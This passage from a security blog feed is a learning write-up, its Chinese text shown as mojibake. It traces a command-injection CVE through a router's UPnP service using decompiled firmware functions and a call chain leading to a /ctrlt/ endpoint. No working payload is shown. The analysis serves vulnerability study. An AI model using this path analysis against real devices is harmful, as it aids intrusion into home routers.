operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token operator">=</span> iVar1 <span class="token operator">+</span> local_e8 <span class="token operator">+</span> local_2c <span class="token operator">+</span> local_30 <span class="token operator">+</span> local_34 <span class="token operator">+</span> local_38 <span class="token operator">+</span> local_3c <span class="token operator">+</span> local_40 <span class="token operator">+</span>              local_44 <span class="token operator">+</span> local_48 <span class="token operator">+</span> local_4c <span class="token operator">+</span> local_50 <span class="token operator">+</span> local_54 <span class="token operator">+</span> local_58 <span class="token operator">+</span> local_5c <span class="token operator">+</span> local_60              <span class="token operator">+</span> local_64 <span class="token operator">+</span> local_68 <span class="token operator">+</span> local_6c <span class="token operator">+</span> local_70 <span class="token operator">+</span> local_74 <span class="token operator">+</span> local_78 <span class="token operator">+</span> local_7c <span class="token operator">+</span>              local_80 <span class="token operator">+</span> local_84 <span class="token operator">+</span> local_88 <span class="token operator">+</span> local_8c <span class="token operator">+</span> local_90 <span class="token operator">+</span> local_94 <span class="token operator">+</span> local_98 <span class="token operator">+</span> local_9c              <span class="token operator">+</span> local_a0 <span class="token operator">+</span> local_a4 <span class="token operator">+</span> local_a8 <span class="token operator">+</span> local_ac <span class="token operator">+</span> local_b0 <span class="token operator">+</span> local_b4 <span class="token operator">+</span> local_b8 <span class="token operator">+</span>              local_bc <span class="token operator">+</span> local_c0 <span class="token operator">+</span> local_c4 <span class="token operator">+</span> local_c8 <span class="token operator">+</span> local_cc <span class="token operator">+</span> local_d0 <span class="token operator">+</span> local_d4 <span class="token operator">+</span> local_d8              <span class="token operator">+</span> local_dc <span class="token operator">+</span> local_e0 <span class="token operator">+</span> local_e4 <span class="token operator">+</span> iVar2 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span>              iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å‡½æ•°è¾ƒé•¿ï¼Œå¯ä»¥ä¸ç”¨æ¯ä¸€è¡Œéƒ½æ˜ç™½ï¼Œå¤§è‡´çœ‹æ‡‚äº†è¯¥å‡½æ•°çš„æ„æ€æ˜¯ï¼Œå¯¹äºéœ€è¦é€šä¿¡çš„è®¾å¤‡å’ŒæœåŠ¡ï¼Œè¿›è¡Œå„è‡ªçš„æ“ä½œï¼Œè·Ÿè¿›Actionå‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹åç»­æ“ä½œã€‚</p><p>åœ¨åç»­çš„æ“ä½œä¸­ï¼Œä¸éš¾å‘ç°è¯¥å‡½æ•°å­˜åœ¨ä¸€ä¸ªæ˜æ˜¾çš„é—´æ¥å‡½æ•°è°ƒç”¨ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ppcVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      __s2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_2 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          __s1 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar2<span class="token punctuation">;</span>          iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ATP_UPNP_Free</span><span class="token punctuation">(</span>__s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xbfffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span>ppcVar2 <span class="token operator">=</span> param_2<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0x40090000</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>åœ¨å‡½æ•°çš„ç¬¬13è¡Œï¼Œ<code>__s2 = *(char **)(g_astActionArray + (int)param_2 * 0x10);</code><br>æŸ¥çœ‹è¯¥å…¨å±€çš„å‡½æ•°å˜é‡ã€‚ä½†æ˜¯å‘ç°æ²¡æœ‰è¯†åˆ«å‡ºæ¥è¿™é‡Œæ•°æ®çš„ç±»å‹ï¼Œç”±äºä¸å¤ªä¼šæ“ä½œGhidraï¼Œæ‰€ä»¥åˆå›åˆ°äº†IDAï¼Œå®šä½åˆ°è¯¥åŒºåŸŸï¼Œæ‰‹åŠ¨è¯†åˆ«äº†ä¸€ä¸‹ï¼ˆæ‡’å¾—å†™idapythonè„šæœ¬ï¼‰<br><img src="https://i.bmp.ovh/imgs/2022/01/3e9c043151bb8b36.png" alt=""></p><p>å…¨å±€çš„è™šè¡¨ï¼Œä½¿ç”¨0å’Œ1æ¥æ ‡å·ï¼Œå¦‚æœä¸º0åˆ™åç§»8çš„ä½ç½®æ˜¯å‡½æ•°ï¼Œå¦‚æœä¸º1åˆ™åç§»8çš„ä½ç½®æ˜¯å­—ç¬¦ä¸²æ•°æ®ã€‚ä»¥æ­¤æ¥ä½œä¸ºä¸€ä¸ªæ ‡è®°ï¼Œæ¥æœ‰åºçš„ï¼Œå¹¶ä¸”ä¿è¯æ­£ç¡®ç±»å‹å‘è°ƒç”¨è€…æä¾›æ¥å£ã€‚</p><p>ç„¶åå›è¿‡å¤´æ¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä¸Šä¸€é¡µçš„è°ƒç”¨ã€‚è¯¥æœåŠ¡çš„å‚æ•°å¯¹åº”çš„æ˜¯åç§»ä¸º0å’Œ1çš„ä½ç½®ï¼Œå…³è”åˆ°æœ¬å‡½æ•°ï¼Œå–å‡ºçš„æ˜¯74åç§»çš„å­—ç¬¦ä¸²ã€‚</p><p>æ­¤æ—¶å‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°æœ‰ç‚¹çœ¼ç†Ÿï¼Œè¿›å»ä¸€çœ‹</p><p><img src="https://i.bmp.ovh/imgs/2022/01/85901983c9b7f862.png" alt=""></p><p>å‘ç°å°±æ˜¯æ¼æ´å‡½æ•°ã€‚äºæ˜¯ç¡®å®šäº†è¯¥æ¼æ´å‡½æ•°çš„è§¦å‘æ—¶åˆ©ç”¨é—´æ¥çš„è™šè¡¨è°ƒç”¨ã€‚æ£€æŸ¥è¯¥è™šè¡¨çš„äº¤å‰å¼•ç”¨ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/6beab2d510dcaca8.png" alt=""></p><p>è°ƒç”¨å‡ºäº†æœ¬å‡½æ•°å…¨éƒ½æ˜¯<code>UPnPGetActionByName</code>å‡½æ•°ã€‚</p><p>ç„¶åä¸€ç›´å‘ä¸Šæ£€æŸ¥äº¤å‰å¼•ç”¨ï¼Œæ£€æŸ¥åˆ°äº†<code>ATP_UPNP_Init</code>å‡½æ•°ã€‚è¯¥å‡½æ•°æ—¶åˆå§‹åŒ–upnpæœåŠ¡æ—¶å€™æ‰€è°ƒç”¨çš„å‡½æ•°ï¼Œ</p><p>é‚£ä¹ˆè‡³æ­¤è¯¥æ¼æ´çš„å‡ºå‘é“¾ä¹Ÿå·²ç»å®Œå…¨å‘ç°äº†ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">main -<span class="token operator">></span> ATP+UPNP_init -<span class="token operator">></span> sub_40B5B4 -<span class="token operator">></span> sub_40A9C8 -<span class="token operator">></span> UPnPGetActionByName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="æ¼æ´è§¦å‘ä½ç½®"><a class="header-anchor" href="#æ¼æ´è§¦å‘ä½ç½®">Â¶</a>æ¼æ´è§¦å‘ä½ç½®</h3><p>çœ‹ä¸€ä¸‹æœ€ç»ˆè§¦å‘æ¼æ´çš„å‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">UPnPGetActionByName</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_3<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>param_4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ppcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ppcVar3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>        ppcVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      pcVar4 <span class="token operator">=</span> ppcVar3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>pcVar4 <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pcVar4 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>        iVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">;</span>        iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>            <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>param_3<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ppcVar3 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token operator">*</span>param_4 <span class="token operator">=</span> pcVar4<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œreturnè¿”å›çš„æ˜¯ï¼Œ<code>return *(undefined4 *)(g_astActionArray + (int)*ppcVar3 * 0x10 + 8);</code>è€Œ<code>(ppcVar3 = *(char ***)(param_1 + 0x24)</code><br>è¿”å›ä¸Šçº§è°ƒç”¨æŸ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/737c1bd8ec3d0bde.png" alt=""></p><p>ç»§ç»­æŸ¥çœ‹<code>UpnpGetServiceByUrl</code>å‡½æ•°ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/1256eca8a4f1d763.png" alt=""></p><p>ç»è¿‡äº†é¢„å¤„ç†ä¹‹åï¼Œå¦‚æœè¿˜æ²¡æœ‰è¿”å›ï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­æ¥ä¸‹æ¥çš„åˆ¤æ–­ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f12f04bdca370358.png" alt=""></p><p>è¿™æ ·çš„åˆ¤æ–­å’Œè™šè¡¨æœ‰äº›ç±»ä¼¼ï¼Œä½†æ˜¯æš‚æ—¶å’Œæˆ‘ä»¬æ‰€éœ€è¦çš„åˆ†æå‡½æ•°ä¸­çš„<code>g_pstUpnpGvarHead</code>å˜é‡æ²¡æœ‰å…³ç³»ï¼Œè¿™ä¸ªå˜é‡åœ¨åæ±‡ç¼–å™¨ä¸­ä¹Ÿçœ‹ä¸åˆ°ã€‚</p><p>ç»§ç»­çœ‹è¿™ä¸ªå‡½æ•°ï¼Œå†<code>if</code>åˆ¤æ–­ä¹‹åï¼Œè¿˜æœ‰ä¸€ä¸ª<code>strcmp</code>å‡½æ•°ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªæ¯”è¾ƒå‡½æ•°çš„å‚æ•°1ï¼Œå·²ç»åˆsnprintfæ”¹ç¼–ä¸ºäº†ç›®å‰åç§»ä½ç½®çš„å‡½æ•°ã€‚è¿›è¡Œäº†ç¬¬äºŒæ¬¡å‡½æ•°åˆ¤åˆ«ï¼Œåˆ¤æ–­è¯¥æœåŠ¡æ˜¯å¦æ˜¯è°ƒç”¨è€…è¦è°ƒç”¨çš„ç›®æ ‡æœåŠ¡ã€‚</p><p>æ‰€ä»¥èƒ½å¤Ÿç¡®å®šè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªï¼Œç¡®å®šè°ƒç”¨è€…è°ƒç”¨æœåŠ¡çš„å‡½æ•°ï¼Œå°±æ˜¯è¯´åªè¦è®¿é—®<code>url</code><br><code>/ctrlt/å‡½æ•°æœåŠ¡</code>å°±å¯ä»¥è®¿é—®å¯¹åº”çš„æœåŠ¡ï¼Œä½†æ˜¯ä»”ç»†çœ‹å°±ä¼šå‘ç°<code>snprintf</code>å‡½æ•°ç»™å‡½æ•°æœåŠ¡è§„å®šäº†ä¸€å®šçš„æ ¼å¼ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/d89af09884dad711.png" alt=""></p><p>åªæœ‰æ»¡è¶³<code>Name_num</code>çš„æ ¼å¼æ‰æ˜¯ä¸€ä¸ªåˆæ³•çš„æœåŠ¡ã€‚å…³äºè¿™ä¸ªå…³é”®çš„å…¨å±€å˜é‡<code>g_pstUpnpGvarHead</code>è¯¥å˜é‡åªæœ‰åœ¨<code>UPNP_Init</code>å‡½æ•°æ‰è¢«è°ƒç”¨ï¼Œäºæ˜¯ç»§ç»­å¾€ä¸Šè¿½è¸ªè¯¥å˜é‡ã€‚</p><p>åœ¨åˆå§‹åŒ–å‡½æ•°ä¸­å‘ç°ï¼Œåœ¨è¿™ä¸€å¥ä¸­åˆå§‹åŒ–äº†ï¼š<code>g_pstUpnpGvarHead = (int *)ATP_UTIL_GVarGetValue(0x20001,0);</code></p><p>å¹¶ä¸”è¯¥å‡½æ•°æ˜¯ä¸ªé“¾æ¥å‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•å¾—çŸ¥å…¶å†…å®¹ï¼Œé‚£ä¹ˆè¯¥å˜é‡çš„åˆ†æå…ˆå‘Šä¸€æ®µè½ï¼ŒåæœŸä¼šåŠ¨æ€è°ƒè¯•è·å¾—è¯¥å†…å­˜çš„å†…å®¹ã€‚</p><p>å›åˆ°<code>sub_40A9C8</code>å‡½æ•°è°ƒç”¨<code>UpnpGetServiceByUr</code>çš„ä½ç½®ã€‚å‘ç°è°ƒç”¨è¯¥å‡½æ•°ä¹‹å‰ä¹Ÿæ˜¯ä¸€äº›urlçš„åˆ†æï¼Œè°ƒç”¨è¯¥å‡½æ•°ä¹‹åï¼Œ</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f65dfda3721d709d.png" alt=""></p><p>æ˜¯åœ¨è§£æxmlæ ¼å¼çš„æ–‡ä»¶ã€‚è§£æå®Œäº†æ ¼å¼å°±ä¼šè°ƒç”¨æ¼æ´å‡½æ•°ï¼Œæ‰€ä»¥æ–­å®šï¼Œæƒ³è¦è§¦å‘å‡½æ•°ï¼Œä¸€å®šè¦è·å¾—ç›®æ ‡å…¨å±€å˜é‡çš„å€¼ï¼Œä½¿ç”¨qemu-mips-staticå¼€å¯è°ƒè¯•æ¨¡å¼å‘ç°ï¼Œä¸ä¼šè¿›å…¥åˆ°upnpåˆå§‹åŒ–é‡Œé¢å»ï¼Œå¯èƒ½æ˜¯è¯¥æœåŠ¡çš„åŸå› ã€‚</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2><ul><li>é€†å‘æœåŠ¡çš„æ—¶å€™ï¼Œè¦ç»†è‡´ï¼Œèƒ½åŠ¨è°ƒå°±è°ƒè¯•ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ä¸Šæ¥å°±è°ƒè¯•ï¼Œä¸­é—´æœ‰è®¸å¤šçš„ç»†èŠ‚è¿˜æ˜¯ä¸è¦ä¸¢å¤±</li><li>è·¯ç”±å™¨æ¼æ´å…¥é—¨ï¼Œå­¦åˆ°äº†è®¸å¤šæ–°çš„çŸ¥è¯†ï¼Œä¹Ÿæ˜¯åˆ†æçš„ç¬¬ä¸€ä¸ªCVEï¼Œè€—æ—¶1å¤©åŠ</li><li>å‘½ä»¤æ³¨å…¥ï¼Œå¤šå¯»æ‰¾systemå‡½æ•°ï¼Œè¿™ç±»å‡½æ•°åœ¨å¤§å‹çš„é¡¹ç›®ä¸­åŸºæœ¬éƒ½ä½¿ç”¨</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆäºŒï¼‰</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
